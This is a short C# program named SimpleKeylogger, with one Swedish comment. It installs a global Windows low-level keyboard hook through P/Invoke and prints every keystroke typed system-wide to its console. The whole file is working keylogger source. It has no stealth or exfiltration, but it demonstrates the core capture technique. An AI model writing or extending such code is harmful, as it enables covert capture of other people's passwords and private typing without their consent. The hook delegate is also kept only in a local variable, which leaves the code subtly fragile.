using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleKeylogger
{
    internal class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;

        private static IntPtr hook = IntPtr.Zero;

        public static void Main(string[] args)
        {
            HookCallbackDelegate hcDelegate = HookCallback;
            IntPtr hModule = GetModuleHandle(null); // Använd null för att hämta handtaget för aktuell modul

            hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, hModule, 0);

            Application.Run();

            UnhookWindowsHookEx(hook);
        }

        private static IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr hMod, uint dwThreadId)
        {
            return SetWindowsHookExA(idHook, lpfn, hMod, dwThreadId);
        }

        private static IntPtr GetModuleHandle(string lpModuleName)
        {
            return GetModuleHandleA(lpModuleName);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Write((Keys)vkCode);
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookExA(int idHook, HookCallbackDelegate lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    }
}
